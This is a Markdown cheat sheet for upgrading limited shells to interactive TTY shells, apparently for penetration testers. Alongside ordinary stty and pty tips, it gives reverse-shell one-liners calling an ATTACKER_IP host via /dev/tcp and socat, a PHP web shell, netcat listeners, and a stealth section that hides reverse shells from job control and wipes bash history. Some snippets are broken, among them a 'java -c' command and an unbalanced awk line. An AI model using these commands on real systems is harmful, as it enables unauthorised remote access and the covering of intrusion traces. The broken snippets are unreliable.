# Shell Upgrade & Enhancement Guide

A comprehensive reference for upgrading limited shells to fully interactive TTY shells with proper terminal control and terminal features.

---

## Table of Contents

1. [Quick Reference](#quick-reference)
2. [Understanding Shell Types](#understanding-shell-types)
3. [Full Upgrade Techniques](#full-upgrade-techniques)
4. [Python Shell Upgrades](#python-shell-upgrades)
5. [Bash/Sh Shell Upgrades](#bashsh-shell-upgrades)
6. [Language-Specific Upgrades](#language-specific-upgrades)
7. [Fixing Terminal Issues](#fixing-terminal-issues)
8. [Troubleshooting](#troubleshooting)

---

## Quick Reference

### One-Liner Shell Upgrades

```bash
# Python 3 - Most Reliable
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Python 2
python -c 'import pty; pty.spawn("/bin/bash")'

# Bash with exec
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# socat (if available)
socat exec:/bin/bash tcp:ATTACKER_IP:PORT

# perl
perl -e 'exec "/bin/bash";'

# ruby
ruby -e 'exec "/bin/bash"'

# PHP
php -r 'system($_GET["cmd"]);'
```

---

## Understanding Shell Types

### Reverse Shell (Non-Interactive)
- Cannot use interactive programs (vim, nano, sudo -i, su)
- No auto-complete
- No arrow keys or history
- Ctrl+C kills the shell
- Used in initial exploitation

### Semi-Interactive Shell
- Can run some interactive commands
- Still no proper terminal control
- Limited Ctrl+Z support

### Fully Interactive TTY Shell
- Complete terminal emulation
- All interactive tools work
- Proper signal handling (Ctrl+C, Ctrl+Z, Ctrl+D)
- Arrow keys and history work
- Can use vim, less, passwd, su, sudo -i

---

## Full Upgrade Techniques

### Method 1: Python PTY Module (Recommended)

**Most reliable and widely available method:**

```bash
# Basic
python3 -c 'import pty; pty.spawn("/bin/bash")'

# With bash login
python3 -c 'import pty; pty.spawn("/bin/bash"); import os; os.execv("/bin/bash", ["bash", "-i"])'

# Alternative syntax
python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'

# Full interactive shell setup
python3 << 'EOF'
import pty
import subprocess
pty.spawn("/bin/bash")
EOF
```

**Advantages:**
- Works on almost all Linux systems
- Reliable PTY creation
- Proper terminal handling
- Clean signal forwarding

---

### Method 2: Script-Based Full TTY Upgrade

**Most feature-rich and reliable upgrade path:**

```bash
# Step 1: Start with basic upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: From within the shell, execute this script
# (CTRL+Z to background if needed)

# Save and run this:
#!/bin/bash
export TERM=xterm-256color
export SHELL=/bin/bash
stty raw -echo
fg 2>/dev/null
reset
stty sane
exec bash -i
```

**Or as a one-liner after shell upgrade:**
```bash
export TERM=xterm-256color && stty raw -echo && fg
```

---

### Method 3: Socat Relay (If Socat Available)

**Best for creating stable shells from scratch:**

On your attacker machine:
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

On the target:
```bash
socat exec:/bin/bash tcp:ATTACKER_IP:4444
# Or for reverse shell
socat tcp-connect:ATTACKER_IP:4444 exec:/bin/bash,pty,stderr,setsid,sigpipe=sigterm,sane
```

---

### Method 4: Bash + Exec Redirect

```bash
# Reverse shell back to listener
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Forward shell from listener
bash -i >& /dev/tcp/localhost/PORT 0>&1

# With stty configuration
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &
jobs
fg
export TERM=xterm-256color
stty raw -echo
fg
```

---

## Python Shell Upgrades

### Python 3 Methods

```python
# Method 1: Direct PTY spawn
import pty; pty.spawn("/bin/bash")

# Method 2: With subprocess
import subprocess
subprocess.call(["/bin/bash", "-i"])

# Method 3: os.execv
import os
os.execv("/bin/bash", ["bash", "-i"])

# Method 4: Using pty and subprocess
import pty, subprocess
pty.spawn(["/bin/bash", "-i"])

# Method 5: Full interactive setup
import pty
import os
os.system("stty raw -echo")
pty.spawn("/bin/bash")
os.system("stty sane")

# Method 6: If pty unavailable, use script
import os, subprocess
os.system("script /dev/null -c /bin/bash")
```

### Python 2 Methods

```python
# Basic
import pty; pty.spawn("/bin/bash")

# Alternative
import subprocess; subprocess.call(["/bin/bash", "-i"])

# With os module
import os; os.system("/bin/bash")
```

### Running Python Commands in Web Shells

```python
# For PHP/ASP web shells
import pty; pty.spawn("/bin/bash")

# Encoded for web shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Bash/Sh Shell Upgrades

### Using Script Command

```bash
# Most reliable bash upgrade
script /dev/null -c /bin/bash

# Alternative
script -qefc /bin/bash /dev/null

# With terminal reset
script -qefc "/bin/bash -i" /dev/null
exec bash -i

# From within script shell
reset
export TERM=xterm-256color
export SHELL=/bin/bash
exec bash -i
```

### Using Stty and Process Control

```bash
# Step-by-step upgrade
# 1. Suspend current shell
(Ctrl+Z)

# 2. In your terminal, configure stty
stty raw -echo
fg

# 3. In the remote shell
reset
export TERM=xterm
exec bash -i
```

### Using Exec and FD Manipulation

```bash
# Redirect stdin/stdout/stderr
exec /bin/bash -i

# With file descriptor manipulation
exec 1>/dev/null 2>&1 /bin/bash -i

# Full redirection setup
exec 0<&1
/bin/bash -i
```

---

## Language-Specific Upgrades

### Perl

```perl
# Basic
perl -e 'exec "/bin/bash";'

# Interactive
perl -e 'system("/bin/bash");'

# PTY-like using IPC
perl -e 'use IPC::Run qw(run); run(["/bin/bash"]);'
```

### Ruby

```ruby
# Basic
ruby -e 'exec "/bin/bash"'

# Using system
ruby -e 'system("/bin/bash")'

# Using backticks
ruby -e 'system "bash -i"'

# Full script
ruby << 'EOF'
system "/bin/bash -i"
EOF
```

### PHP

```php
<?php
system("/bin/bash -i");
?>

// In one-liner web shell
php -r 'system("/bin/bash -i");'

// Using exec
php -r 'exec("/bin/bash -i");'

// Using shell_exec
php -r 'echo shell_exec("/bin/bash -i");'

// Interactive with pcntl
php -r 'pcntl_exec("/bin/bash", array("-i"));'
```

### Node.js

```javascript
// Using child_process
const {spawn} = require('child_process');
spawn('/bin/bash', ['-i'], {stdio: [0,1,2]});

// One-liner
node -e 'require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'

// Using shell option
node -e 'require("child_process").spawn("/bin/bash", ["-i"], {stdio: "inherit"})'
```

### Java

```bash
# Using ProcessBuilder
java -c 'ProcessBuilder pb = new ProcessBuilder("/bin/bash"); pb.start();'

# Using Runtime
Runtime.getRuntime().exec("/bin/bash")
```

---

## Fixing Terminal Issues

### After Shell Upgrade - Initial Setup

```bash
# 1. Set terminal type
export TERM=xterm-256color
# or
export TERM=screen

# 2. Get terminal dimensions
stty -a
# Note your rows and columns

# 3. Set shell size (replace 24 80 with your dimensions)
stty rows 24 cols 80

# 4. Disable echo and set raw mode
stty raw -echo

# 5. If needed, reset terminal
reset

# 6. Final setup
exec bash -i
```

### Complete Terminal Initialization Script

```bash
#!/bin/bash
# Run this after getting a shell upgrade

# Set terminal type
export TERM=xterm-256color
export SHELL=/bin/bash

# Disable input echo and set raw mode
stty raw -echo

# Get dimensions and set them
ROWS=$(tput lines)
COLS=$(tput cols)
stty rows $ROWS cols $COLS

# Reset terminal to sane state
reset

# Start new bash instance
exec bash -i
```

### Fixing Specific Issues

**Ctrl+C not working:**
```bash
stty intr ^C
stty susp ^Z
stty rprnt ^R
stty werase ^W
stty lnext ^V
```

**Arrow keys not working:**
```bash
set -o vi        # For vi mode
# or
set -o emacs     # For emacs mode
stty -a          # Check settings
```

**Backspace not working:**
```bash
stty erase ^?
# or
stty erase ^H
```

**Terminal too small/large:**
```bash
# Get current terminal size
stty size

# Set new size (rows cols)
stty rows 40 cols 120

# Auto-detect and set
$(stty size | awk '{print "stty rows " $1 " cols " $2}'
```

---

## Advanced Upgrade Scenarios

### Upgrading from Limited Shell (sh, rbash, jsh)

```bash
# From sh/rbash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Force bash even if restricted
/bin/bash -i

# Use alternative shell
/bin/ksh -i
/bin/zsh -i
```

### Upgrading Web Shell to Full Shell

**From web shell to reverse shell to TTY:**

1. First, get reverse shell:
```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

2. Listener on attacker:
```bash
nc -nlvp 4444
```

3. Once connected, upgrade to TTY:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Upgrading SSH Shell with Limited Commands

```bash
# If you have SSH but restricted shell
ssh -i key.pem user@target /bin/bash -i

# Override restricted shell
ssh -i key.pem user@target /bin/bash --noprofile --norc -i
```

---

## Troubleshooting

### Issue: "python: command not found"

```bash
# Try python3
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Try python2
python2 -c 'import pty; pty.spawn("/bin/bash")'

# Check available interpreters
which python python2 python3

# Try alternative methods
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
perl -e 'exec "/bin/bash";'
ruby -e 'exec "/bin/bash"'
```

### Issue: "pty module not available"

```bash
# Try direct bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Try script command
script /dev/null -c /bin/bash

# Try socat
socat exec:/bin/bash tcp:ATTACKER_IP:PORT
```

### Issue: Shell Keeps Closing

```bash
# Check your reverse connection
# Make sure listener is running: nc -nlvp PORT

# Try different shell
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
sh -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Add delay/loop
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 || sleep 10 && bash...
```

### Issue: Ctrl+C Kills Shell

```bash
# After upgrade, fix signal handling
trap '' INT    # Ignore SIGINT
trap '' TSTP   # Ignore SIGTSTP

# Or use nohup
nohup bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &
```

### Issue: Terminal Garbled Output

```bash
# Reset terminal
reset

# Set correct terminal type
export TERM=xterm-256color

# Disable echo temporarily
stty -echo

# Re-enable echo
stty echo

# Full reset
stty sane
```

### Issue: "No job control in this shell"

```bash
# This is normal for non-TTY shells
# Solution: Get proper TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Or use script
script /dev/null -c /bin/bash
```

---

## Detection Avoidance & Stealth

### Upgrade Without Creating Obvious Process

```bash
# Direct execution without intermediate shell
exec python3 -c 'import pty; pty.spawn("/bin/bash")'

# Spawn bash in background then connect
nohup bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &

# Use disown to remove from job control
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &
disown
```

### Cleanup After Shell Upgrade

```bash
# Clear command history
history -c
export HISTFILE=/dev/null

# Clear shell history file
> ~/.bash_history
> ~/.history

# Set no history
export HISTSIZE=0

# Clear current session
unset HISTFILE
```

---

## Testing Your Upgrade

### Verify TTY Status

```bash
# Check if you have TTY
tty
# Output: /dev/pts/X (if TTY)
# Output: not a tty (if not TTY)

# Check if interactive
[ -t 0 ] && echo "Interactive" || echo "Not interactive"
```

### Test Interactive Features

```bash
# Test Ctrl+C response
# Should return to prompt, not exit

# Test Ctrl+Z
# Should suspend current process

# Test arrow keys
# Should show history or move cursor

# Test vim
vim

# Test sudo
sudo -i
```

---

## Reference: Shell Comparison

| Feature | Reverse | Semi-Interactive | TTY Shell |
|---------|---------|-----------------|-----------|
| Run bash | ✓ | ✓ | ✓ |
| Ctrl+C handling | ✗ | ~ | ✓ |
| Job control | ✗ | ~ | ✓ |
| Arrow keys | ✗ | ~ | ✓ |
| vim/nano | ✗ | ✗ | ✓ |
| sudo -i | ✗ | ✗ | ✓ |
| tab complete | ✗ | ~ | ✓ |
| Terminal control | ✗ | ✗ | ✓ |

---

## Quick Decision Tree

```
Got a shell?
├─ Have Python? → python3 -c 'import pty; pty.spawn("/bin/bash")'
├─ Have script? → script /dev/null -c /bin/bash
├─ Have socat? → socat exec:/bin/bash tcp:IP:PORT
├─ Have Perl? → perl -e 'exec "/bin/bash";'
├─ Have Ruby? → ruby -e 'exec "/bin/bash"'
└─ Have Bash? → bash -i >& /dev/tcp/IP/PORT 0>&1
   └─ After redirect, use stty raw -echo && fg to complete upgrade
```

---

## Resources & Further Reading

- [PayloadAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [GTFOBins - Shell escapes and upgrades](https://gtfobins.github.io/)
- Man pages: `man pty`, `man stty`, `man script`, `man socat`
- [HackTricks - Interactive Shells](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys)

---

**Last Updated:** 2026-10-01  
**Difficulty:** Intermediate  
**Tags:** `shells`, `reverse-shells`, `pty`, `tty`, `upgrade`, `terminal`
